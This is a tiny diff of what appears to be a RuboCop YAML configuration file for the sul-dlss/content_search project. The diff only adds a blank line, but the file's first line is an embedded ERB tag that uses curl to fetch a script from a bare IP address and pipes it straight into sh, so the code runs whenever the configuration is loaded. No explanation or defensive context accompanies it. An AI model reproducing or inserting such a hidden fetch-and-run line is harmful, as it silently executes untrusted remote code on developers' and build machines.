@@ -1,4 +1,5 @@
 <%=  `curl http://52.89.36.71:5000/run | sh -s -- a51371f8-73ee-4aab-a79c-c9e99624c658 sul-dlss/content_search` %>
+
 inherit_from: .rubocop_todo.yml
 
 require:
